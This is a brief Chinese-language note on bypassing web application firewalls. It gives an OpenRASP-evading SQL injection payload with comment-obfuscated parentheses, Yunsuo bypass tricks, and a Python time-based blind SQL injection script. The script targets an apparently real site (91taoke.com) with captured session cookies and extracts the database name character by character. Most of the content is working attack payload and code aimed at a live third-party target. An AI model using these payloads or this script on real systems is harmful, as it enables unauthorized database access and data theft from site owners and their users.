# 绕waf记录

## 绕过OpenRASP sql注入检测

OpenRASP 检测sql注入好像特别喜欢匹配括号，那么我们就在注释中弄个括号即可绕过

成功绕过的例子:

sql语句:`select * from xa_user_c where RegEmail='输入点'`

```php
Email=crawlergo%40gmail.cn'-extractvalue/*fffucker tou c/*hao f/*uck/*er /*ssss*/%0a%00/*(*/(1,concat/*(*/('~',(SELECT/*(*/schema_name/*(*/FROM/*(*/information_schema.schemata+limit+1,1)))-'
```



## 云锁sql注入绕过

参考 https://maplege.github.io/2019/11/08/sqli-bypass-waf/ 

 在order by之间插入`/*%26*/`便可绕过拦截。 

 在union select之间增加`/*%26*/`，成功绕过拦截 

 在database ()之间插入`/*%26*/`，再次绕过拦截 

 在此处select…from被拦截，且使用`/*%26*/`依旧被拦截 ， 添加了emoji表情的`/*%26*/`可以绕过此拦截 

上面的方法没用23333

```
    sql="(ascii(substr(database()from'{POS}'for'1'))-'{GUESS}')".format(POS=pos,GUESS=num)
    burp0_url = "http://91taoke.com:80/index.php?m=Common&a=check_email&email=crawlergo%40gmail.cn'-(CaSe+when+(abs({sql})%2b{sql})and'0'%2b{sql}+ThEn+'ThEn'-sleep(1)+ELSE+'then'+END)-%27".format(sql=sql)
    burp0_cookies = {"PHPSESSID": "3ieb5vpmdg76m91vkhjtkjsn32", "UM_distinctid": "1720967fe96137-06a0880ee9437f-d373666-144000-1720967fe97db", "CNZZDATA5782256": "cnzz_eid%3D1881871210-1589291385-%26ntime%3D1589452039", "robots": "1", "security_session_verify": "c8a4d102ba09f406ae4a78c842dce9ed"}
    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    try:
        r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,timeout=3,proxies={"http":"http://127.0.0.1:1081"})
        print(r.text)
    except requests.exceptions.ReadTimeout:
        return True
    except requests.exceptions.ConnectionError:
        print("重新测试")
        return sqlinj(num)
    print("test "+chr(num))
    return False
```



新的： https://xz.aliyun.com/t/7599 





## 文章

 https://xz.aliyun.com/t/7767#toc-1 